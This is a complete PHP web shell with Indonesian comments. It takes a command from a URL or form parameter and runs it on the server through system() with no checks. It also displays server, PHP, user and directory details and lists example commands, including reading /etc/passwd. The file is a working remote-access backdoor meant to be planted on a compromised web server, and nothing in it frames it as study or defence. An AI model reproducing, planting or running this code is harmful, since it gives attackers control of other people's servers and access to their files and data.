<?php
// ============================================
// SIMPLE PHP SHELL - VERSION LENGKAP
// ============================================

// Cek perintah
$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';

// Header untuk tampilan
if($cmd) {
    echo "<!DOCTYPE html>
    <html>
    <head>
        <title>Shell Output</title>
        <style>
            body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}
            .cmd{color:#ffff00}
            pre{background:#1a1a1a;padding:15px;border-left:3px solid #00ff00}
            a{color:#00ff00}
        </style>
    </head>
    <body>
        <h2 class='cmd'>▶ Command: " . htmlspecialchars($cmd) . "</h2>
        <pre>";
    system($cmd . " 2>&1");
    echo "</pre>
        <hr>
        <a href='?'>↩ Back to Shell</a>
    </body>
    </html>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
    <style>
        body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px}
        input[type=text]{background:#1a1a1a;color:#00ff00;border:1px solid #00ff00;padding:12px;width:70%;font-size:16px}
        input[type=submit]{background:#00ff00;color:#000;border:none;padding:12px 25px;cursor:pointer;font-weight:bold}
        .info{color:#888;font-size:13px;margin:5px 0}
        .example{color:#666;font-size:12px}
        .example code{background:#1a1a1a;padding:2px 8px;border-radius:3px}
    </style>
</head>
<body>
    <h1>🔥 PHP Shell</h1>
    <div class="info">📡 Server: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?></div>
    <div class="info">🐘 PHP: <?= phpversion() ?></div>
    <div class="info">👤 User: <?= system('whoami') ?></div>
    <div class="info">📁 CWD: <?= getcwd() ?></div>
    <hr>
    <form method="get">
        <input type="text" name="cmd" placeholder="Enter command (e.g. id, ls -la, whoami)" autofocus>
        <input type="submit" value="▶ Execute">
    </form>
    <hr>
    <div class="example">
        <strong>📌 Examples:</strong><br>
        <code>?cmd=id</code> - Current user<br>
        <code>?cmd=ls -la</code> - List files<br>
        <code>?cmd=whoami</code> - Username<br>
        <code>?cmd=pwd</code> - Current directory<br>
        <code>?cmd=cat /etc/passwd</code> - Read file<br>
        <code>?cmd=php -v</code> - PHP version
    </div>
</body>
</html>
